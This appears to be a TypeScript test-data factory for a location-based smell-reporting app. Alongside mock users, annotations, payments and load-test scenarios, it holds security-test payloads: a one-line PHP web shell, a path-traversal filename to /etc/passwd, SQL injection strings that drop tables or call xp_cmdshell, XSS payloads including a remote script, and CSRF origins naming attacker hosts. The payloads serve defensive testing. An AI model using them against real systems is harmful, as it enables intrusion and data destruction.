/**
 * 测试数据工厂
 * 用于生成各种测试用的模拟数据
 */

import { faker } from '@faker-js/faker/locale/zh_CN';

export class TestDataFactory {
  // 创建用户数据
  createUser(overrides: any = {}) {
    return {
      id: faker.string.uuid(),
      email: faker.internet.email(),
      username: faker.internet.username(),
      password: 'TestPassword123!',
      role: 'user',
      avatar: faker.image.avatar(),
      bio: faker.lorem.paragraph(),
      location: faker.location.city(),
      createdAt: faker.date.past(),
      updatedAt: faker.date.recent(),
      ...overrides
    };
  }

  // 创建用户注册数据
  createUserRegistrationData(overrides: any = {}) {
    return {
      email: faker.internet.email(),
      username: faker.internet.username(),
      password: 'TestPassword123!',
      confirmPassword: 'TestPassword123!',
      agreeToTerms: true,
      ...overrides
    };
  }

  // 创建标注数据
  createAnnotationData(overrides: any = {}) {
    const smellTypes = ['industrial', 'domestic', 'natural', 'chemical', 'food', 'waste'];
    const descriptions = [
      '工业废气味道很浓',
      '垃圾处理站附近的恶臭',
      '化工厂排放的刺鼻气味',
      '餐厅油烟味道',
      '下水道异味',
      '汽车尾气味道'
    ];

    return {
      latitude: parseFloat(faker.location.latitude({ min: 31.1, max: 31.4, precision: 6 })),
      longitude: parseFloat(faker.location.longitude({ min: 121.3, max: 121.6, precision: 6 })),
      smellType: faker.helpers.arrayElement(smellTypes),
      intensity: faker.number.int({ min: 1, max: 5 }),
      description: faker.helpers.arrayElement(descriptions),
      images: [],
      verified: faker.datatype.boolean(),
      tags: faker.helpers.arrayElements(['工业污染', '环境问题', '需要关注'], { min: 0, max: 3 }),
      ...overrides
    };
  }

  // 创建位置数据
  createLocationData(overrides: any = {}) {
    return {
      latitude: parseFloat(faker.location.latitude({ min: -90, max: 90, precision: 6 })),
      longitude: parseFloat(faker.location.longitude({ min: -180, max: 180, precision: 6 })),
      accuracy: faker.number.int({ min: 1, max: 100 }),
      altitude: faker.number.int({ min: -100, max: 8000 }),
      heading: faker.number.int({ min: 0, max: 360 }),
      speed: faker.number.float({ min: 0, max: 50, precision: 0.1 }),
      timestamp: Date.now(),
      ...overrides
    };
  }

  // 创建可疑的位置数据（用于GPS欺骗测试）
  createSuspiciousLocationData(overrides: any = {}) {
    const suspiciousPatterns = [
      // 瞬移（两次位置间距离过远）
      { latitude: 31.2304, longitude: 121.4737, accuracy: 1 },
      // 速度异常（短时间内移动过快）
      { latitude: 31.2304, longitude: 121.4737, speed: 200 }, // 200 m/s
      // 精度异常
      { latitude: 31.2304, longitude: 121.4737, accuracy: 0.1 }, // 过高精度
      // 固定位置模式（多次相同坐标）
      { latitude: 31.230400, longitude: 121.473700, accuracy: 5 }
    ];

    return faker.helpers.arrayElement(suspiciousPatterns);
  }

  // 创建指定距离的位置
  createLocationAtDistance(baseLat: number, baseLng: number, distanceMeters: number) {
    // 简单的距离计算（实际应用中需要更精确的地理计算）
    const earthRadius = 6371000; // 地球半径（米）
    const dLat = distanceMeters / earthRadius;
    const dLng = distanceMeters / (earthRadius * Math.cos(baseLat * Math.PI / 180));

    return {
      latitude: baseLat + (dLat * 180 / Math.PI),
      longitude: baseLng + (dLng * 180 / Math.PI),
      accuracy: faker.number.int({ min: 5, max: 20 }),
      timestamp: Date.now()
    };
  }

  // 创建支付数据
  createPaymentData(overrides: any = {}) {
    return {
      amount: faker.number.float({ min: 1, max: 100, precision: 0.01 }),
      currency: 'cny',
      paymentMethod: faker.helpers.arrayElement(['card', 'alipay', 'wechat']),
      description: faker.commerce.productDescription(),
      metadata: {
        userId: faker.string.uuid(),
        annotationId: faker.string.uuid()
      },
      ...overrides
    };
  }

  // 创建评论数据
  createCommentData(overrides: any = {}) {
    return {
      content: faker.lorem.sentences(faker.number.int({ min: 1, max: 3 })),
      parentId: null,
      mentions: [],
      images: [],
      ...overrides
    };
  }

  // 创建聊天消息数据
  createChatMessageData(overrides: any = {}) {
    return {
      message: faker.lorem.sentence(),
      roomId: faker.string.uuid(),
      timestamp: Date.now(),
      type: 'text',
      ...overrides
    };
  }

  // 创建文件上传数据
  createFileData(overrides: any = {}) {
    const fileTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
    const extensions = ['jpg', 'png', 'gif', 'webp'];
    
    const type = faker.helpers.arrayElement(fileTypes);
    const extension = extensions[fileTypes.indexOf(type)];
    
    return {
      filename: `${faker.lorem.word()}.${extension}`,
      mimetype: type,
      size: faker.number.int({ min: 1024, max: 5 * 1024 * 1024 }), // 1KB to 5MB
      buffer: Buffer.from(faker.lorem.paragraphs()),
      ...overrides
    };
  }

  // 创建恶意文件数据（安全测试用）
  createMaliciousFileData(type: 'executable' | 'script' | 'oversized' | 'path_traversal' = 'executable') {
    const maliciousFiles = {
      executable: {
        filename: 'virus.exe',
        mimetype: 'application/octet-stream',
        buffer: Buffer.from('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00') // PE header
      },
      script: {
        filename: 'malicious.php',
        mimetype: 'application/x-php',
        buffer: Buffer.from('<?php system($_GET["cmd"]); ?>')
      },
      oversized: {
        filename: 'large_file.jpg',
        mimetype: 'image/jpeg',
        size: 100 * 1024 * 1024, // 100MB
        buffer: Buffer.alloc(100 * 1024 * 1024)
      },
      path_traversal: {
        filename: '../../../etc/passwd',
        mimetype: 'text/plain',
        buffer: Buffer.from('root:x:0:0:root:/root:/bin/bash')
      }
    };

    return maliciousFiles[type];
  }

  // 创建SQL注入载荷
  createSQLInjectionPayloads() {
    return [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' OR 1=1 --",
      "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
      "'; DELETE FROM annotations; --",
      "' OR username LIKE '%admin%' --",
      "\"; DROP DATABASE smellpin; --",
      "' AND 1=(SELECT COUNT(*) FROM tabname); --",
      "' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users)); --",
      "' WAITFOR DELAY '00:00:05' --",
      "'; EXEC xp_cmdshell('net user'); --"
    ];
  }

  // 创建XSS载荷
  createXSSPayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<div onmouseover="alert(\'XSS\')">Hover me</div>',
      '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
      '<body onload="alert(\'XSS\')">',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";",
      '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
      '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<img src="javascript:alert(\'XSS\')">'
    ];
  }

  // 创建NoSQL注入载荷
  createNoSQLInjectionPayloads() {
    return [
      { "$ne": null },
      { "$gt": "" },
      { "$where": "function() { return true; }" },
      { "$regex": ".*" },
      { "$or": [{"password": {"$regex": ".*"}}, {"username": {"$regex": ".*"}}] },
      { "$nin": [] },
      { "$exists": true },
      { "$type": 2 },
      { "$mod": [1, 0] },
      { "$all": [] }
    ];
  }

  // 创建CSRF测试数据
  createCSRFTestData() {
    return {
      maliciousOrigins: [
        'https://malicious-site.com',
        'http://localhost:3000.evil.com',
        'data:text/html,<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        'https://attacker.example.com'
      ],
      maliciousReferers: [
        'https://malicious-site.com/csrf-attack',
        'http://evil.example.com/steal-data',
        'https://phishing-site.net/fake-login'
      ]
    };
  }

  // 创建性能测试数据
  createPerformanceTestData(count: number = 100) {
    return Array.from({ length: count }, () => ({
      annotations: this.createAnnotationData(),
      user: this.createUser(),
      comment: this.createCommentData(),
      location: this.createLocationData()
    }));
  }

  // 创建负载测试场景
  createLoadTestScenarios() {
    return {
      lightLoad: {
        duration: 60000, // 1分钟
        concurrentUsers: 10,
        requestsPerSecond: 5
      },
      mediumLoad: {
        duration: 300000, // 5分钟
        concurrentUsers: 50,
        requestsPerSecond: 20
      },
      heavyLoad: {
        duration: 600000, // 10分钟
        concurrentUsers: 100,
        requestsPerSecond: 50
      },
      spikeLoad: {
        duration: 30000, // 30秒
        concurrentUsers: 200,
        requestsPerSecond: 100
      },
      stressTest: {
        duration: 900000, // 15分钟
        concurrentUsers: 500,
        requestsPerSecond: 200
      }
    };
  }

  // 创建边界值测试数据
  createBoundaryTestData() {
    return {
      coordinates: {
        valid: [
          { latitude: 90, longitude: 180 },
          { latitude: -90, longitude: -180 },
          { latitude: 0, longitude: 0 }
        ],
        invalid: [
          { latitude: 91, longitude: 0 },
          { latitude: -91, longitude: 0 },
          { latitude: 0, longitude: 181 },
          { latitude: 0, longitude: -181 },
          { latitude: 'invalid', longitude: 'invalid' },
          { latitude: null, longitude: null }
        ]
      },
      strings: {
        empty: '',
        short: 'a',
        medium: 'a'.repeat(100),
        long: 'a'.repeat(1000),
        veryLong: 'a'.repeat(10000),
        unicode: '测试中文字符🎉',
        special: '!@#$%^&*()_+-={}[]|\\:";\'<>?,./',
        null: null,
        undefined: undefined
      },
      numbers: {
        zero: 0,
        negative: -1,
        positive: 1,
        float: 3.14159,
        largeInt: Number.MAX_SAFE_INTEGER,
        smallInt: Number.MIN_SAFE_INTEGER,
        infinity: Infinity,
        negativeInfinity: -Infinity,
        nan: NaN
      }
    };
  }

  // 创建时区测试数据
  createTimezoneTestData() {
    const timezones = [
      'UTC',
      'America/New_York',
      'Europe/London',
      'Asia/Shanghai',
      'Asia/Tokyo',
      'Australia/Sydney',
      'Pacific/Auckland'
    ];

    return timezones.map(timezone => ({
      timezone,
      timestamp: new Date().toLocaleString('en-US', { timeZone: timezone }),
      offset: new Date().getTimezoneOffset()
    }));
  }

  // 创建多语言测试数据
  createMultiLanguageTestData() {
    return {
      chinese: '这是中文测试数据',
      english: 'This is English test data',
      japanese: 'これは日本語のテストデータです',
      korean: '이것은 한국어 테스트 데이터입니다',
      arabic: 'هذه بيانات اختبار باللغة العربية',
      emoji: '测试表情符号 🚀 🎉 💯',
      mixed: 'Mixed语言test数据😀'
    };
  }

  // 创建并发测试数据
  createConcurrencyTestData(scenarios: number = 5) {
    return Array.from({ length: scenarios }, (_, index) => ({
      scenarioId: index + 1,
      users: Array.from({ length: 10 + index * 5 }, () => this.createUser()),
      annotations: Array.from({ length: 20 + index * 10 }, () => this.createAnnotationData()),
      requests: Array.from({ length: 50 + index * 25 }, () => ({
        endpoint: faker.helpers.arrayElement([
          '/api/v1/annotations/list',
          '/api/v1/annotations/nearby',
          '/api/v1/users/profile/me',
          '/api/v1/annotations',
          '/api/v1/users/stats'
        ]),
        method: faker.helpers.arrayElement(['GET', 'POST', 'PUT', 'DELETE']),
        delay: faker.number.int({ min: 0, max: 1000 })
      }))
    }));
  }
}